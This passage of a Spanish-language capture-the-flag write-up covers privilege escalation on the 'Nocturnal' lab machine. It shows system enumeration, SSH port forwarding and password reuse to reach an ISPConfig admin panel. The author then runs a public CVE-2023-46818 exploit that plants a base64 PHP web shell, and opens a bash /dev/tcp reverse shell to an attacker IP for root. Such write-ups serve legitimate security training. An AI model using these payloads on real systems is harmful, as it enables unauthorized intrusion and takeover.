+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.11.64<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tobias@10.10.11.64&#39;</span>s password:
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tobias@nocturnal:~$ cat user.txt
+</span></span><span style="display:flex;"><span>e3d59***************************
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<p>Una vez que estamos dentro de la máquina host empezamos a hacer enumeración del sistema.</p>
+<p>Revisamos los permisos de sudoers, los permisos SUID y al revisar los servicios internos vemos que tiene un servicio corriendo en el puerto 8080.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tobias@nocturnal:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> tobias:
+</span></span><span style="display:flex;"><span>Sorry, user tobias may not run sudo on nocturnal.
+</span></span><span style="display:flex;"><span>tobias@nocturnal:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>tobias<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>tobias<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>tobias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tobias@nocturnal:~$ find / -perm -4000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/at
+</span></span><span style="display:flex;"><span>/usr/bin/fusermount
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>tobias@nocturnal:~$ netstat -ano | grep LISTEN
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8080          0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:25            0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:33060         0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:587           0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Con lo cual vamos a aplicar port forwarding via ssh para abrirnos un túnel entre la máquina victima y la máquina atacante y revisar desde nuestra máquina la página web.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Aquí lo que estamos haciendo es Local Port Forwarding, es decir, redirigimos el puerto local de una máquina a nuestro puerto remoto.</span>
+</span></span><span style="display:flex;"><span>❯ ssh tobias@10.10.11.64 -L 8080:127.0.0.1:8080
+</span></span></code></pre></div><p>Ahora abrimos el navegador y vemos que tenemos en el puerto 8080 en localhost, en el encontramos una aplicación web con un panel de identificación:</p>
+<p><img alt="Nocturnal_Machine_7" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_7.png"></p>
+<p>Pruebo las credenciales de tobias pero me da un error ya que al parecer no son correctas para este panel. Entonces me pongo a buscar un posible leak de información o alguna pista para conseguir acceso a index.php en la carpeta /var.</p>
+<p>Revisando la carpeta de logs en /var/log me encuentro con una carpeta llamada ispconfig que dentro contiene un auth.log. Y ahí veo que hay un login succesful con el usuario &ldquo;admin&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tobias@nocturnal:/var/log/ispconfig$ ls -l
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">301</span> May  <span style="color:#ae81ff">4</span> 08:49 auth.log
+</span></span><span style="display:flex;"><span>tobias@nocturnal:/var/log/ispconfig$ cat auth.log
+</span></span><span style="display:flex;"><span>Successful login <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;admin&#39;</span>  from 127.0.0.1 at 2025-04-09 10:19:13 with session ID vo10b400dv579klascjkkf1568
+</span></span><span style="display:flex;"><span>Successful login <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;admin&#39;</span>  from 127.0.0.1 at 2025-04-09 10:54:48 with session ID k6cfshre0jfnp81hetdrc1c67a
+</span></span><span style="display:flex;"><span>Failed login <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;tobias&#39;</span> from 127.0.0.1 at 2025-05-04 08:49:39
+</span></span></code></pre></div><p>Entonces voy al panel pruebo a poner como usuario a admin y uso la contraseña de tobias, y consigo acceso al index.php</p>
+<p><img alt="Nocturnal_Machine_8" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_8.png"></p>
+<p>Enumerando la pagina index.php encontramos la versión de ISPConfig y con una rápida búsqueda en google encontramos la vulnerabilidad disponible.</p>
+<p><img alt="Nocturnal_Machine_9" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine_9.png"></p>
+<h2 id="cve-2023-46818---ispconfig-exploit---php-code-injection">CVE-2023-46818 - ISPConfig Exploit - PHP Code Injection<a hidden class="anchor" aria-hidden="true" href="#cve-2023-46818---ispconfig-exploit---php-code-injection">#</a></h2>
+<p><a href="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-46818">https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-46818</a></p>
+<blockquote>
+<p>En las versiones iguales o menores a la 3.2.11 se ha encontrado una vulnerabilidad que te permite inyectar código PHP autentificado en el endpoint /admin/language_edit.php que puede llevar a un RCE. Esto ocurre debido al uso de un input mal sanitizado en el archivo de lenguage usado para generar código PHP dinámico.</p>
+</blockquote>
+<p>Para llevar a cabo la explotación he usado este POC hecho en bash encontrado en github:</p>
+<p><a href="https://github.com/rvizx/CVE-2023-46818">https://github.com/rvizx/CVE-2023-46818</a></p>
+<p>Aunque yo le he cambiado una parte del código que usaba el comando (jq) para codificar cadenas en formato URL. Ya que yo no tenia instalado jq en mi máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Soluciones posibles si no tienes jq instalado en el sistema:</span>
+</span></span><span style="display:flex;"><span>sudo pacman -S jq
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># O cambiar esta herramienta y usar python3 para codificar la cadena URL.</span>
+</span></span><span style="display:flex;"><span>ENCODED_INJECT<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;%s&#39;</span> <span style="color:#e6db74">&#34;</span>$INJECT<span style="color:#e6db74">&#34;</span> | jq -s -R -r @uri<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>ENCODED_INJECT<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#34;import urllib.parse; print(urllib.parse.quote(input()))&#34;</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#e6db74">&#34;</span>$INJECT<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><p><em>Instalar jq es la opción más rápida y que deja el código más limpio, pero es una opción que podemos usar en el caso de no tener el comando jq.</em></p>
+<p>Una vez hecho esto he tirado ha ejecutar el payload pero me daba el siguiente error:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> shell has been deployed to: http://127.0.0.1:8080/admin/sh.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> starting interactive shell. type <span style="color:#e6db74">&#39;exit&#39;</span> to quit.
+</span></span><span style="display:flex;"><span>./exploit.sh: line 87: syntax error: unexpected end of file
+</span></span></code></pre></div><p>Esto pasa porque el código del POC usa un bucle while para llevar a cabo el RCE y encontramos un pequeño error de sintaxis en el código, al acabar el while no lo cierra con un &ldquo;done&rdquo;.</p>
+<p>Simplemente arreglamos ese pequeño error y ya podemos ejecutar el payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ./exploit.sh http://127.0.0.1:8080/ admin slowmotionapocalypse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> normalizing url...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> cleaning previous session and preparing temp files...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> logging in as user: <span style="color:#e6db74">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> login successful
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> random language file to trigger injection: lrozzfcq.lng
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sending language edit request to fetch CSRF tokens...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> csrf_id <span style="color:#f92672">=</span> language_edit_1334ce81ef75ee918845260e
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> csrf_key <span style="color:#f92672">=</span> c9be0d447f361849295ece6494c70b7e0039e442
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> building php web shell payload using base64 encoding with ____ markers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> base64 payload: PD9waHAgcHJpbnQoJ19fX18nKTsgcGFzc3RocnUoYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9DJ10pKTsgcHJpbnQoJ19fX18nKTsgPz4<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sending injection payload using POST to language_edit.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> shell has been deployed to: http://127.0.0.1:8080/admin/sh.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> starting interactive shell. type <span style="color:#e6db74">&#39;exit&#39;</span> to quit.
+</span></span><span style="display:flex;"><span>ispconfig-shell# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Ya hemos conseguido la shell como root pero la forma de trabajar aquí es incomoda con lo cual preparo una reverse shell y me abro el puerto en escucha en otra terminal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ispconfig-shell# bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/1234 0&gt;&amp;1&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> no output detected, raw response below:
+</span></span><span style="display:flex;"><span>________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#En el listener:</span>
+</span></span><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>Connection from 10.10.11.64:42138
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>844<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>root@nocturnal:/usr/local/ispconfig/interface/web/admin# cd
+</span></span><span style="display:flex;"><span>cd
+</span></span><span style="display:flex;"><span>root@nocturnal:~# cat root.txt
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span><span style="display:flex;"><span>dc1a9***************************
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">Cybersecurity Borhub Home</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
